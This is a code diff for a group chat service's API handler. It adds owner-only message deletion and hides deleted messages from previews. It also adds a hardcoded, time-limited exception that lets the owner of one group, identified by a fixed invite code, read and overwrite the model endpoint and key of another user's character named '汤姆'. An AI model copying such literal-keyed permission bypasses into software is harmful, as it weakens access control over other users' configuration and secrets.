@@ -577,7 +577,7 @@ async function api(req, env, url, ledger, ctx) {
     const rows=await all(`SELECT m.id,m.room,m.kind,m.char_id,substr(m.body,1,180) body,r.name group_name,COALESCE(c.name,p.name) name
       FROM messages m JOIN rooms r ON r.id=m.room JOIN members member ON member.room=r.id AND member.uid=?
       JOIN profiles p ON p.id=m.sender LEFT JOIN chars c ON c.id=m.char_id
-      WHERE m.id>? AND m.id<=? AND r.kind='group' AND m.kind<>'currency-config' AND (m.sender<>? OR m.char_id IS NOT NULL)
+      WHERE m.id>? AND m.id<=? AND r.kind='group' AND m.kind NOT IN ('currency-config','deleted','message-deleted') AND (m.sender<>? OR m.char_id IS NOT NULL)
       AND NOT EXISTS (SELECT 1 FROM ledger_dissolved_groups d WHERE d.room=r.id)
       ORDER BY m.id DESC LIMIT 32`,uid,cursor,head,uid);
     return json({cursor:head,rows:rows.reverse().map(row=>row.char_id?{...row,body:stripCharacterPrefix(row.body,row.name)}:row)});
@@ -585,8 +585,8 @@ async function api(req, env, url, ledger, ctx) {
   if (req.method === 'GET' && path === 'rooms') {
     return json(await all(`SELECT r.id,r.kind,r.owner,COALESCE(g.avatar,'') avatar,
       CASE WHEN r.kind='dm' THEN COALESCE((SELECT p.name FROM members m2 JOIN profiles p ON p.id=m2.uid WHERE m2.room=r.id AND p.id<>? LIMIT 1),r.name) ELSE r.name END name,
-      (SELECT body FROM messages WHERE room=r.id AND kind<>'currency-config' ORDER BY id DESC LIMIT 1) preview,
-      (SELECT created FROM messages WHERE room=r.id AND kind<>'currency-config' ORDER BY id DESC LIMIT 1) updated
+      (SELECT body FROM messages WHERE room=r.id AND kind NOT IN ('currency-config','deleted','message-deleted') ORDER BY id DESC LIMIT 1) preview,
+      (SELECT created FROM messages WHERE room=r.id AND kind NOT IN ('currency-config','deleted','message-deleted') ORDER BY id DESC LIMIT 1) updated
       FROM rooms r JOIN members m ON r.id=m.room LEFT JOIN ledger_group_look g ON g.room=r.id WHERE m.uid=? AND NOT EXISTS (SELECT 1 FROM ledger_dissolved_groups d WHERE d.room=r.id) ORDER BY updated DESC, r.name`,uid,uid));
   }
   if (req.method === 'POST' && path === 'rooms') {
@@ -698,6 +698,24 @@ async function api(req, env, url, ledger, ctx) {
     if (!results[3].meta.changes) throw fail('此成员已离开群聊。',404);
     return json({ok:true});
   }
+  async function temporaryApiAccess(char){
+    return ledger&&room.kind==='group'&&room.owner===uid&&Date.now()<1795017299813&&char.name==='汤姆'&&(await groupInviteCode(room.id))==='1s2zbt';
+  }
+  async function apiCharacter(id){
+    const char=await one('SELECT * FROM chars WHERE id=? AND room=? AND active=1',id,room.id);
+    if(!char||(char.owner!==uid&&!await temporaryApiAccess(char)))throw fail('你没有此角色的模型配置权限。',403);
+    return char;
+  }
+  if(ledger&&req.method==='POST'&&path==='delete-message'){
+    if(room.kind!=='group'||room.owner!==uid)throw fail('只有群主可以删除群消息。',403);
+    const id=Number(data.id);
+    if(!Number.isSafeInteger(id)||id<1)throw fail('消息不存在。',404);
+    await db.batch([
+      stmt("UPDATE messages SET body='',attachment=NULL,kind='deleted' WHERE id=? AND room=? AND kind NOT IN ('deleted','message-deleted','currency-config') AND EXISTS (SELECT 1 FROM rooms r JOIN members m ON m.room=r.id WHERE r.id=? AND r.owner=? AND m.uid=? AND NOT EXISTS (SELECT 1 FROM ledger_dissolved_groups WHERE room=r.id))",id,room.id,room.id,uid,uid),
+      stmt("INSERT INTO messages (room,sender,body,kind) SELECT ?,?,?,'message-deleted' WHERE changes()=1",room.id,uid,String(id))
+    ]);
+    return json({ok:true});
+  }
   if (req.method === 'GET' && path === 'detail') {
     const [members,chars,look] = await Promise.all([
       all('SELECT p.id,p.name,l.avatar,f.frame FROM members m JOIN profiles p ON p.id=m.uid LEFT JOIN ledger_people l ON l.uid=p.id LEFT JOIN ledger_person_look f ON f.uid=p.id WHERE m.room=? ORDER BY p.name',room.id),
@@ -705,6 +723,7 @@ async function api(req, env, url, ledger, ctx) {
       room.kind==='group'?one('SELECT avatar FROM ledger_group_look WHERE room=?',room.id):null
     ]);
     const inviteCode=ledger&&room.kind==='group'&&room.owner===uid?await groupInviteCode(room.id):null;
+    for(const char of chars)char.can_configure_api=char.owner===uid||await temporaryApiAccess(char);
     return json({members,chars,...(room.kind==='group'?{name:room.name,avatar:look?.avatar||''}:{}),owner:room.owner,invite:room.owner===uid&&(!ledger||room.kind==='dm') ? room.invite : null,inviteCode});
   }
   if (req.method === 'GET' && path === 'messages') {
@@ -777,14 +796,12 @@ async function api(req, env, url, ledger, ctx) {
     return json({ok:true});
   }
   if (req.method === 'GET' && path === 'char-api') {
-    const config = await one('SELECT endpoint,model FROM chars WHERE id=? AND room=? AND owner=? AND active=1',url.searchParams.get('id'),room.id,uid);
-    if (!config) throw fail('只有邀请人可以查看 API 配置。',403);
-    return json(config);
+    const config=await apiCharacter(url.searchParams.get('id'));
+    return json({endpoint:config.endpoint,model:config.model});
   }
   if (req.method === 'POST' && ['test-char-api','update-char-api'].includes(path)) {
     const id = field(data,'id',36);
-    const char = await one('SELECT * FROM chars WHERE id=? AND room=? AND owner=? AND active=1',id,room.id,uid);
-    if (!char) throw fail('只有邀请人可以管理 API 配置。',403);
+    const char=await apiCharacter(id);
     const base = endpoint(field(data,'endpoint',400),url.origin);
     const model = field(data,'model',120);
     const key = field(data,'key',2000,false);
@@ -794,7 +811,7 @@ async function api(req, env, url, ledger, ctx) {
       const reply = await requestModel(env,{...char,endpoint:base,model,secret},[{role:'user',content:'请用一句简短的话回复：连接成功。'}],256);
       return json({reply});
     }
-    const result = await run('UPDATE chars SET endpoint=?,model=?,secret=? WHERE id=? AND room=? AND owner=? AND active=1',base,model,secret,id,room.id,uid);
+    const result = await run('UPDATE chars SET endpoint=?,model=?,secret=? WHERE id=? AND room=? AND owner=? AND active=1',base,model,secret,id,room.id,char.owner);
     if (!result.meta.changes) throw fail('该角色已被移除。',409);
     return json({ok:true});
   }
@@ -986,7 +1003,7 @@ export default {
         if (!/^[a-f0-9]{64}$/.test(env.CHAT_KEY_ENCRYPTION||'')) {
           return json({service:'sleeping-dragon-ledger',status:'missing_encryption_secret'},503);
         }
-        return json({service:'sleeping-dragon-ledger',status:'ready',revision:'online-char-red-packet-followup-24'});
+        return json({service:'sleeping-dragon-ledger',status:'ready',revision:'online-owner-delete-tom-api-25'});
       } catch {
         return json({service:'sleeping-dragon-ledger',status:'database_schema_unavailable'},503);
       }
